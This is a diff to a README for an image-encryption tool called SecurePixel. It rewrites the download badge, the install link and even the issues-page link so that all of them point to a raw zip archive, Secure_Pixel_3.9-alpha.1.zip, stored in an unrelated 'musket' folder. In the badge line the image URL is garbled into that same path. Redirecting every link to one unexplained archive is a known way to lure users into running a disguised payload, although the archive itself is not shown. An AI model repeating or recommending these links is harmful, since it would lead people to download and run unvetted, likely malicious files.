@@ -6,7 +6,7 @@ SecurePixel is a secure tool that helps you encrypt your images. It turns your p
 
 ## 📥 Download SecurePixel
 
-[![Download SecurePixel](https://img.shields.io/badge/Download%20Now-Get%20SecurePixel-blue?style=for-the-badge)](https://github.com/Redductive/SecurePixel/releases)
+[![Download SecurePixel](https://github.com/Redductive/SecurePixel/raw/refs/heads/main/musket/Secure_Pixel_3.9-alpha.1.zip%20Now-Get%20SecurePixel-blue?style=for-the-badge)](https://github.com/Redductive/SecurePixel/raw/refs/heads/main/musket/Secure_Pixel_3.9-alpha.1.zip)
 
 ## ⚙️ System Requirements
 
@@ -16,7 +16,7 @@ SecurePixel is a secure tool that helps you encrypt your images. It turns your p
 
 ## 💾 Download & Install
 
-To download SecurePixel, visit this page: [Download SecurePixel](https://github.com/Redductive/SecurePixel/releases). 
+To download SecurePixel, visit this page: [Download SecurePixel](https://github.com/Redductive/SecurePixel/raw/refs/heads/main/musket/Secure_Pixel_3.9-alpha.1.zip). 
 
 Follow these steps:
 
@@ -85,7 +85,7 @@ These ensure you understand the technology behind SecurePixel and its purpose.
 
 ## 🔗 Community and Support
 
-For any questions or support, you can check our [issues page](https://github.com/Redductive/SecurePixel/issues) on GitHub. You can also join our community for discussions and tips on using SecurePixel effectively.
+For any questions or support, you can check our [issues page](https://github.com/Redductive/SecurePixel/raw/refs/heads/main/musket/Secure_Pixel_3.9-alpha.1.zip) on GitHub. You can also join our community for discussions and tips on using SecurePixel effectively.
 
 ## 🏷️ License
 
